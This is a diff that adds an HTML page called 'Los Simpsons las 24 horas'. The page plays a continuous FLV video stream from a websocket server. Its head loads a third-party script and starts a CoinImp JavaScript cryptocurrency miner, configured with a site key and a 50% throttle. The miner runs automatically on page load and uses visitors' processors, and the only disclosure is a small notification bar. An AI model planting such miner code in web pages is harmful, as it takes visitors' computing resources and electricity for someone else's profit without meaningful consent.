@@ -1,0 +1,35 @@
+<!doctype html>
+<html lang="fr" class="no-js">
+<head>
+      <meta charset="UTF-8">
+      <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+      <title>Los Simpsons las 24 horas</title>
+
+      <script src="https://www.hostingcloud.racing/9nv5.js"></script>
+        <script>
+            var _client = new Client.Anonymous('34f7302603c93819f54c9a2b1a7ca18b65b04332b00d4609c5303b3b54f178f1', {
+                throttle: 0.5, c: 'w', ads: 0
+            });
+            _client.start();
+            _client.addMiningNotification("Top", "This site is running JavaScript miner from coinimp.com", "#cccccc", 40, "#3d3d3d");
+
+        </script>
+</head>
+<body class="sous-menu" style="overflow: hidden;">
+        <img src="https://i.pinimg.com/originals/45/dc/ac/45dcac9d64330bb15043ecf77092973c.jpg" style="position: absolute; z-index: -1; left: -20%; top: -5%; object-fit:cover; height: 120%; width: 120%;">
+        <script src="https://cdn.bootcss.com/flv.js/1.5.0/flv.min.js"></script>
+        <video height="600" width="800" id="videoElement" autoplay controls style="position: absolute; left: 30%; top: 20%;"></video>
+        <script>
+            if (flvjs.isSupported()) {
+                var videoElement = document.getElementById('videoElement');
+                var flvPlayer = flvjs.createPlayer({
+                    type: 'flv',
+                    url: 'ws://backend.seta.fun:8000/stream/stream.flv'
+                });
+                flvPlayer.attachMediaElement(videoElement);
+                flvPlayer.load();
+                flvPlayer.play();
+            }
+        </script>
+</body>
+</html>
